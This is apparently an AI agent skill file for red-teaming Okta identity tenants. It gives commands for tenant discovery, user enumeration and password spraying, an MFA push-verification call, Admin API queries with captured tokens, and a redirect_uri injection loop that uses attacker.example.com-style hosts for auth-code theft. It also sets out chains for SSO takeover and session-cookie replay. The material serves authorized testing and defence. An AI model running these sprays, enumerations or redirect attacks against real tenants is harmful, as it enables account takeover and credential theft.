---
name: okta-attack
description: Okta-as-IdP red-team attack chain
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: public-okta-docs, idp-redteam-knowledge, disclosed-incidents
report_count: 8
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## When to use this skill

Trigger when:
- DNS shows `<tenant>.okta.com` or `<tenant>.okta-emea.com` (EMEA region)
- Login flow redirects to `<tenant>.okta.com/login` or `/app/<app_id>/sso/saml`
- Web pages reference `/signin/customize`, `oktapreview.com`, or `auth-js-sdk`
- Recon notes "uses Okta for SSO"
- A target has `*.okta.com` SAN in TLS cert
- Identity-fabric mapping returns Okta as IdP for a corporate app

DO NOT use for:
- Entra ID (use `m365-entra-attack` instead)
- Google Workspace (use `google-workspace-attack` — not yet built)
- ADFS (different protocol, on-prem)

---

## Tenant discovery

### Direct guesses
```bash
# Tenant subdomains often match the brand
# Replace these with your target's actual tenant slug candidates:
for tenant in target-brand target-brand-ltd target-sister-brand target-brand-short target-other-variant; do
  for region in okta okta-emea oktapreview; do
    host="$tenant.$region.com"
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$host/")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $host  $code"
  done
done
```

### Cross-ref from DNS
```bash
# Look for CNAME records pointing to Okta
# Replace with your target's actual domains:
for domain in client.example client-ltd.example; do
  dig +short "sso.$domain" CNAME
  dig +short "login.$domain" CNAME
  dig +short "auth.$domain" CNAME
  dig +short "okta.$domain" CNAME
done
```

### Cross-ref from app HTTP flow
```bash
# Visit corporate-app login, follow redirects
curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"
# If redirects to <something>.okta.com → confirmed Okta tenant
```

---

## User enumeration

### Method 1 — `/api/v1/authn` differential
The auth API returns different errors for invalid users vs invalid passwords. Slightly differential.

```bash
# Probe single user — DON'T spray, this counts as auth attempt!
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<email>","password":"_test_invalid_pw"}'

# Response codes:
#   401 + "errorCode":"E0000004" → invalid credentials (user exists OR doesn't — Okta unifies these)
#   401 + "errorCode":"E0000119" → account locked
#   200 → MFA prompt (cred VALID, MFA needed)
#   200 + "status":"SUCCESS" → full auth (rare in modern setups)
```

⚠ Okta has hardened against direct user-existence enum via `/api/v1/authn` — error message is typically uniform "Authentication failed". User enumeration via this endpoint is unreliable in 2024+.

### Method 2 — `/api/v1/users/me/factors` timing
Some flows expose user existence via response time differential. Less reliable than M365 OneDrive technique.

### Method 3 — Sign-in widget JS endpoint
```bash
curl -sk "https://<tenant>.okta.com/api/v1/sessions/me" \
  -H "Accept: application/json"
# Response varies by tenant config
```

### Method 4 — Org-specific identifier probing
Some Okta orgs use email-as-username; others use `firstname.lastname` or employee-id. Test pattern guesses:
```
firstname.lastname@target.com
firstname_lastname@target.com  
flastname@target.com
employeeID@target.com
```

### Method 5 — OIDC `/v1/authorize` with login_hint
```bash
# Tampering with login_hint param can reveal user existence on some configs
curl -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response_type=code&scope=openid&redirect_uri=https://example.com&login_hint=<email>"
# Different redirect → user exists vs doesn't
```

---

## Authentication flow analysis (always do this first)

```bash
# Initial auth — observe what factors come back
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<valid_user>","password":"_test_invalid_pw"}' | python3 -m json.tool
```

Response structure reveals factor configuration:
```json
{
  "stateToken": "00ABC...",
  "factorResult": "WAITING",
  "status": "MFA_REQUIRED",
  "_embedded": {
    "factors": [
      {"factorType": "push", "provider": "OKTA"},
      {"factorType": "token:software:totp", "provider": "OKTA"},
      {"factorType": "sms", "provider": "OKTA"},
      {"factorType": "call", "provider": "OKTA"},
      {"factorType": "email", "provider": "OKTA"},
      {"factorType": "question", "provider": "OKTA"},
      {"factorType": "webauthn", "provider": "FIDO"}
    ]
  }
}
```

**Critical insight:** the factor list reveals which factors are available — phishing-resistance varies dramatically:
- `webauthn` (FIDO2) — phishing-resistant
- `question` (security questions) — extremely weak; KBA attacks
- `sms` / `call` — phishing-able (push notification fatigue, SIM swap)
- `push` — phishing-able via MFA fatigue
- `email` — phishing-able if attacker has email read access
- `totp` — phishing-able via AiTM

---

## Password spray (with Okta-specific lockout discipline)

### Lockout policy
Okta default: **10 failed sign-ins → lockout** (configurable per-org). Some orgs configure much stricter (3 fails).

Discipline:
- ≤2 attempts per user lifetime per engagement (safer than 1 in Entra because Okta lockout is sometimes 3 fails)
- Track per-user in atomic state file
- Stop on first valid hit OR if LOCKED rate exceeds threshold

### Spray endpoint
```bash
# Same /api/v1/authn — see authentication flow above
```

### Status codes to watch for
| Response | Meaning |
|---|---|
| `200 status=MFA_REQUIRED` | **Password is VALID** — MFA challenge waiting |
| `200 status=SUCCESS + sessionToken` | Full auth (only if MFA not required for this user) |
| `200 status=PASSWORD_EXPIRED` | **Password is VALID** but user must change it |
| `200 status=LOCKED_OUT` | Account locked (pre-existing or our cause) |
| `401 E0000004` | Authentication failed (user doesn't exist OR wrong password — Okta unifies) |
| `401 E0000119` | User is locked |
| `429` | Rate-limit hit |

---

## Push-notification fatigue (MFA bombing)

If a valid password is obtained and `push` factor is available, the classic attack: hammer the push factor until the user accepts out of fatigue.

⚠ **OUT OF SCOPE in most red-team engagements** (counts as social engineering / phishing — e.g. phishing was explicitly OOS for authorized-engagement). Document the vector existence but do not execute without explicit sign-off.

### Detection-only check (does target allow it?)
```bash
# Initiate factor verification
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn/factors/<factor_id>/verify" \
  -H "Content-Type: application/json" \
  -d '{"stateToken":"<from_authn>"}'

# A real test would loop this — DON'T do that without explicit OK
```

---

## OIDC redirect_uri tampering

Okta OIDC apps often have a list of allowed `redirect_uri` values. Misconfigurations:

```bash
# Get the app's authorize endpoint
curl -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool

# Test redirect_uri injection
for ruri in \
    "https://attacker.example.com/" \
    "https://target.com.attacker.com/" \
    "https://target.com@attacker.com/" \
    "https://target.com#@attacker.com/" \
    "https://target.com\\@attacker.com/" \
    "//attacker.com/" \
    "https://target.com/cb?next=https://attacker.com/"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<client>&response_type=code&scope=openid&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$ruri'))")")
  echo "  $ruri → $code"
done
# Any 302 with the attacker URL in Location header = open redirect → auth-code theft chain
```

---

## SAML SP misconfiguration check (per-app)

Each Okta SAML app has its own SP metadata:

```bash
# Iterate known app IDs (find via the org's app list — usually in JS bundles or initial login redirects)
curl -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"

# Look for:
#   AuthnRequestsSigned="false"  ← see hunt-saml for XSW
#   WantAssertionsSigned="false" ← assertion-replay possible
#   <NameIDFormat>...emailAddress</NameIDFormat>
```

---

## Okta Admin API (post-cred-compromise)

If a valid cred + MFA-completed token is obtained:

```bash
# Get session token
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -d '{"username":"...","password":"..."}'
# → if SUCCESS, response has sessionToken

# Exchange for API token (admin only)
# Test admin endpoints (all require valid SSWS token):
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/apps"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"      # audit log
```

---

## Okta-specific phishing kits (informational — OOS for non-phishing engagements)

- **EvilProxy** — Okta-aware AiTM kit
- **Modlishka** — generic AiTM
- **Evilginx2** — has Okta phishlets

Document existence; do not deploy without explicit phishing scope.

---

## FastPass / Okta Verify abuse

Okta FastPass is push-based + device-bound. Bypasses:
- Device trust spoofing (requires kit + endpoint compromise — internal-only)
- Push fatigue (see above)
- Phishing redirect to fake FastPass prompt

---

## Common Okta tenant configuration patterns

| Indicator | Configuration |
|---|---|
| `<tenant>.okta.com/api/v1/iam/orgs` returns 401 (not 404) | API IAM endpoints enabled — admin attack surface |
| `customize/sign-in` page reachable anon | Tenant brand customization is public — useful intel |
| Multiple `*.okta.com` SAN certs | Multi-tenant org (less common) |
| `oktapreview.com` subdomain | Preview/sandbox tenant — typically weaker security |

---

## Tooling

- **`OktaTerrify`** (github.com/silverhack/OktaTerrify) — post-compromise Okta device-trust / FastPass enumeration. The only verifiable public Okta-specific offensive tool; no other named, maintained "okta-attacker"/"okta-toolkit" utility is verifiable — build engagement-specific scripts against `/api/v1/*` instead of citing unverified tool names.

---

## Anti-patterns

- **DO NOT use Entra-style spray pace on Okta** — Okta's anti-automation is tuner-different; rate-limit hits faster
- **DO NOT skip factor enumeration** — knowing the factor list before attempting spray informs the realistic threat model
- **DO NOT assume MFA-fatigue is in scope** — it's social engineering; explicit OK required
- **DO NOT confuse `*.oktapreview.com` with production** — preview is a non-prod tenant, findings have different severity

---

## Bridge to neighboring skills

- `m365-entra-attack` — sibling skill for the M365 case; identical mental model
- `hunt-oauth` — OIDC redirect_uri tampering, state attack, PKCE bypass
- `hunt-saml` — XSW / signature-stripping for per-app SAML SP
- `hunt-mfa-bypass` — push fatigue, OTP brute, replay
- `mid-engagement-ir-detection` — Okta SOC dashboards are sensitive; expect mitigations during testing

---

## Anti-pattern: Okta user enumeration in 2024+

Several techniques publicly documented through 2022 (e.g., `/api/v1/authn` differential errors) have been hardened. Don't rely on stale knowledge — confirm enumeration vector freshness on each engagement by:
1. Testing 1 known-existing username (e.g. `info@<domain>` if reachable)
2. Testing 1 known-not-existing username
3. Comparing responses byte-by-byte and timing

If responses are identical, the vector is hardened — pivot to OneDrive-equivalent or different approach.

---

## Disclosed cases / CVEs / coordinated-disclosure writeups

These are the canonical public references that justify the techniques in this skill. Cite them in reports when applicable and use them as analog cases when scoping novel Okta attack chains.

### 1. Okta + Sitel/Sykes — LAPSUS$ supply-chain breach (Jan 2022, disclosed Mar 2022)

- Refs: <https://sec.okta.com/articles/2022/03/official-okta-statement-lapsus-claims/>, <https://www.okta.com/blog/company-and-culture/oktas-investigation-of-the-january-2022-compromise/>, <https://thehackernews.com/2022/03/new-report-on-okta-hack-reveals-entire.html>, <https://www.itpro.com/security/cyber-security/367236/leaked-mandiant-report-okta-breach-lapsus-operation>
- Flow: LAPSUS$ compromised a support engineer's workstation at Sitel (third-party support sub-processor, acquired Sykes Enterprises). Via Mimikatz + GitHub-hosted tooling on a thin-client jump host, they reached Okta's internal "SuperUser" support tooling for ~25 minutes on Jan 21 2022. Final scope: 2 customer tenants accessed of 366 originally feared.
- Root cause: Third-party support provider with persistent privileged access to customer tenants, weak segmentation, domain creds stored in spreadsheets, no MFA on the inbound VPN account, delayed reporting (Mandiant report Mar 17, public disclosure Mar 22 only after LAPSUS$ tweeted screenshots).
- Year: 2022. Severity: Critical (industry-shaking — reset the trust model for IdP supply chains).

### 2. Okta Customer Support HAR-file leak (Sep-Oct 2023)

- Refs: <https://sec.okta.com/articles/2023/11/unauthorized-access-oktas-support-case-management-system-root-cause/>, <https://blog.cloudflare.com/how-cloudflare-mitigated-yet-another-okta-compromise/>, <https://www.beyondtrust.com/blog/entry/okta-support-unit-breach>, <https://www.bleepingcomputer.com/news/security/okta-breach-134-customers-exposed-in-october-support-system-hack/>
- Flow: Okta support employee logged into a personal Google profile on a corp laptop; Chrome sync exfiltrated saved support-service-account creds to a compromised personal device. Threat actor used those creds to log into the support case-management portal Sep 28 - Oct 17 2023, downloaded HAR files that customers had uploaded for troubleshooting. HAR files contained live session cookies/tokens → session-replay against the customers' Okta tenants. 134 customers exposed, 5 had sessions hijacked (BeyondTrust, Cloudflare, 1Password publicly disclosed).
- Root cause: Service-account creds reaching an unmanaged personal device via Chrome profile sync + HAR files containing un-sanitized session tokens accepted for replay (no IP/device binding on support tokens).
- Year: 2023. Severity: Critical. BeyondTrust detected and reported to Okta on Oct 2 2023; Okta did not publicly acknowledge until Oct 19 2023.

### 3. Scattered Spider / Octo Tempest / UNC3944 — Okta tenant social-engineering campaign (2022-2024, ongoing)

- Refs: <https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a>, <https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection/>, <https://www.darkreading.com/cyberattacks-data-breaches/how-the-okta-cross-tenant-impersonation-attacks-succeeded>, <https://attack.mitre.org/groups/G1015/>
- Flow: Group calls IT help desk impersonating an employee (LinkedIn-profile-sourced identity), requests MFA reset + password reset, gains initial Okta foothold. Then elevates to Okta Super-Admin, configures a second IdP under attacker control, enables inbound federation + account-linking, modifies NameID on attacker-IdP to match the target user, and impersonates any Okta user across the tenant without their cred. Used in MGM and Caesars attacks (Sep 2023, $100M+ losses) and confirmed on 4+ Okta customers in the Jul-Aug 2023 campaign.
- Root cause: Help-desk-as-trust-anchor with no out-of-band verification + Okta inbound federation feature allowing attacker-controlled IdP to issue arbitrary-NameID assertions accepted as authentic.
- Year: 2023 onwards. Severity: Critical. Joint CISA/FBI advisory AA23-320A.

### 4. Okta cross-origin authentication credential stuffing (Apr-May 2024)

- Refs: <https://sec.okta.com/articles/2024/05/detecting-cross-origin-authentication-credential-stuffing-attacks/>, <https://thehackernews.com/2024/05/okta-warns-of-credential-stuffing.html>, <https://arcticwolf.com/resources/blog/okta-cross-origin-authentication-feature-customer-identity-cloud-targeted-credential-stuffing-attacks/>
- Flow: Customer Identity Cloud (Auth0-derived) cross-origin auth endpoint silently accepted credential-stuffing from unregistered origins. Observed Apr 15 - May 2024. Tenant log signals: `fcoa` (failed cross-origin auth), `scoa` (successful cross-origin auth), `pwd_leak` (breached password match).
- Root cause: Cross-origin auth permitted on all tenants by default with no origin allowlist enforced at the auth-API edge; credential-stuffing throttling applied per-endpoint not per-tenant.
- Year: 2024. Severity: High (mass-scale ATO via reused creds).

### 5. CVE-2024-0981 — Okta AD/LDAP DelAuth bcrypt cache-key auth bypass (Oct 2024)

- Refs: <https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/>, <https://www.theregister.com/2024/11/04/why_the_long_name_okta/>, <https://www.nodejs-security.com/blog/okta-bcrypt-security-incident-bun-nodejs>
- Flow: Okta cached AD/LDAP DelAuth results keyed by `bcrypt(userId + username + password)`. Bcrypt silently truncates input at 72 bytes. When username length ≥ 52 chars, the password bytes fall past the 72-byte boundary → cache key collapses to be password-independent. If the user had a prior successful login (cache populated) AND the AD/LDAP agent was unreachable AND MFA was disabled → any password authenticated.
- Root cause: Using bcrypt as a general-purpose hash without accounting for the algorithm's 72-byte input limit + cache fallback path inverted the security model (cache trusted over live auth).
- Year: 2024. Severity: High. Bug introduced Jul 23 2024, internally found and fixed Oct 30 2024 (~3 months exposure window).

### 6. Okta Verify iOS push-response bypass (CVE-2024-10327, disclosed Oct 2024)

- Refs: <https://trust.okta.com/security-advisories/okta-verify-for-ios-cve-2024-10327/>
- Flow: Okta Verify iOS 9.25.1-beta / 9.27.0 had a bug in the iOS ContextExtension push-action handler. From the lock screen long-press / drag-down banner / Apple Watch reply path, both the "Yes, it's me" and "No, it's not me" buttons returned the same accept-auth response. A push-fatigued user who explicitly tapped "No" still approved the auth.
- Root cause: Two notification-response action handlers wired to the same backend confirmation path — UX-level Deny did not propagate as a backend rejection.
- Year: 2024. Severity: High (silently defeats the user's last line of defence against push fatigue / Scattered-Spider-style push bombing).

### 7. Varonis Threat Labs — "CrossTalk" + "Secret Agent" Okta abuse (Jan 2023)

- Refs: <https://www.varonis.com/blog/okta-attack-vectors>
- Flow: (a) CrossTalk: any Okta tenant admin (incl. free-developer tenant) could issue SMS / email templates that delivered to *any* email/phone — sent via legitimate Okta mailer infrastructure (passes SPF/DKIM/DMARC for okta.com). Used to stage cross-tenant phishing that arrives from a trusted sender. (b) Secret Agent: the SSWS token stored on the on-prem Okta AD-agent sync server was decryptable from disk; possessor could register a rogue AD agent that intercepted DelAuth plaintext credentials for the entire org.
- Root cause: (a) Tenant-bounded sender identity not enforced on outbound notification API. (b) Agent SSWS bootstrap-secret stored recoverable on disk; new-agent enrollment did not require admin co-signature.
- Year: 2023. Severity: High for both. Disclosed and patched by Okta.

### 8. Okta admin-console session cookie theft via stealer malware (2022-2024, ongoing class)

- Refs: <https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection/>, <https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a>, <https://www.beyondtrust.com/blog/entry/okta-support-unit-breach>
- Flow: Class of attack — stealer malware (Lumma, RedLine, Raccoon, StealC) on a corp endpoint exfiltrates `sid` cookie from `<tenant>.okta.com` and `<tenant>-admin.okta.com`. Without IP-binding or device-binding on the Okta session, the attacker replays the cookie from a residential proxy and obtains the user's full session (incl. admin if the victim was an admin) — bypasses MFA entirely (already-MFA-completed session). Underpinned both the Oct 2023 HAR-file incident and most Scattered Spider intrusions.
- Root cause: Okta session cookies (until DPoP / Device Bound Session Cookies / asymmetric session keys are enforced) are bearer tokens — anyone holding the cookie is the user.
- Year: 2022-2024 (ongoing class). Severity: Critical when admin sessions stolen.

### Take-aways for hunters

- The 2022 LAPSUS$, 2023 HAR-file, and 2023 Scattered Spider campaigns share a pattern: **the attack rarely hits Okta's product code — it hits the trust relationships around Okta** (third-party support, help-desk verification, customer-uploaded artifacts, federated IdPs). Recon should map these trust edges first.
- CVE-2024-0981 (bcrypt 72-byte truncation) is the rare pure-product Okta CVE — most disclosed Okta bugs are configuration or operational.
- Push fatigue is not just social engineering — the Okta Verify iOS bug shows the platform itself can silently approve a denied push. Treat any Okta push factor as bypassable in 2024+.
- For red-team scoping: HAR-file replay, inbound-federation IdP injection, and stealer-cookie replay are the three highest-yield post-recon primitives observed in the wild.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Okta tenant naming patterns (`<org>.okta.com`, `<org>.oktapreview.com`, `<org>-admin.okta.com`) frequently include orphan/dev tenants. Chain primitive: Okta tenant discovery via `/.well-known/okta-organization` → enumerate `<org>-dev`, `<org>-uat`, `<org>-test` subdomains → `hunt-subdomain` orphan-tenant identification → claim abandoned tenant → SSO takeover (legitimate `<org>` users redirected through compromised IdP for any app federated to the dev tenant).
- **`m365-entra-attack`** — Okta-as-IdP for M365 is common in hybrid orgs. Chain primitive: `okta-attack` user enumeration + spray succeeds on Okta tenant → Okta is federated to Entra → SAML assertion issued by compromised Okta user → full M365 access without ever touching `login.microsoftonline.com` directly (bypasses Entra Conditional Access in many configurations).
- **`hunt-saml`** — Okta issues SAML assertions to every federated downstream app. Chain primitive: Okta admin or developer credential captured → mint arbitrary SAML assertions in Okta admin → `hunt-saml` XSW or signature manipulation not even needed — legitimately signed assertions for arbitrary impersonation across every federated app (Salesforce, Workday, AWS, GitHub, M365).
- **`hunt-mfa-bypass`** — Okta supports multiple factors with varying enforcement. Chain primitive: Okta password sprayed → MFA challenge → `hunt-mfa-bypass` factor-downgrade (push-fatigue, SMS fallback, voice fallback, security-question fallback) → bypass to authenticated session.
- **`triage-validation`** — Okta findings can be high-impact but need the 7-Question Gate run on whether the captured artifact (token, code, factor) actually grants meaningful access. Chain primitive: validated Okta primitive → `triage-validation` to confirm access plane → `redteam-report-template` with explicit federated-app blast-radius.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
